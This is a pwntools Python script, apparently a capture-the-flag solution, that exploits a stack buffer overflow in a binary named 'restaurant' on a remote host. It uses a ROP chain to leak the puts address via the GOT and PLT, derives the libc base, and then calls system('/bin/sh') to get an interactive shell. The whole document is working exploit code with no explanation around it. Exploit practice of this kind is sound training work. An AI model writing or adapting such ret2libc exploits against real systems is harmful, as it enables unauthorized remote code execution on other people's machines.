from pwn import * 
context.log_level = 'debug'
r = remote('206.189.28.180', 30088)
#r = process('./restaurant_patched')
#r = gdb.debug('./restaurant_patched', 'set follow-fork-mode child\nb fill\nc')
e = ELF('./restaurant')
libc = ELF('./libc.so.6')
def send(b):
    r.sendlineafter(b'>', b)

send(b'1')
send(b'$\x00' + b'a'*(0x20+8-2) + p64(0x00000000004010a3) + p64(e.got['puts']) + p64(e.plt['puts']) + p64(e.sym['fill']))
r.recvuntil(b'$')
puts_addr = u64(r.recv(6) + b'\x00\x00')
print(f'puts_addr = {hex(puts_addr)}')
libc.address = puts_addr - libc.sym['puts']
print(f'libc.address = {hex(libc.address)}')
send(b'a'*(0x20+8) + p64(0x00000000004010a3) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(0x000000000040063e) + p64(libc.sym['system']))

r.interactive()
